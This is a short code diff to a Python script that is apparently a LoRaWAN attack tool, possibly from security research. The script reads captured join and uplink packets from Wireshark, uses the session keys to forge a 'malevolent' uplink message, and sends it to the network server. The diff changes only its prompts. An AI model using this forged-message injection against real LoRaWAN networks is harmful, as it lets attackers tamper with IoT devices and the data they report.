@@ -73,7 +73,7 @@ AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3')  # Arbitrary AppSKey
 
 while True:
     # Get Join Accept packet directed to the NS captured from Wireshark (hex string without spaces)
-    join_answer = input("Insert Join Answer packet from Wireshark: ")
+    join_answer = input("Insert Join Answer packet containing NwkSKey (9001 -> 9000) from Wireshark: ")
     # Get intercepted unconfirmed uplink packet (used to extract FCnt)
     uul_pkt = input("Insert intercepted unconfirmed uplink packet from Wireshark: ")
 
@@ -93,7 +93,7 @@ while True:
     direction = 0  # Uplink
 
     # Compose and send a fake application-layer message
-    mal_msg = input("Insert malevolent message:")
+    mal_msg = input("Insert malevolent message: ")
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
     print("[ATTACKER] Malevolent message forwarded to NS")
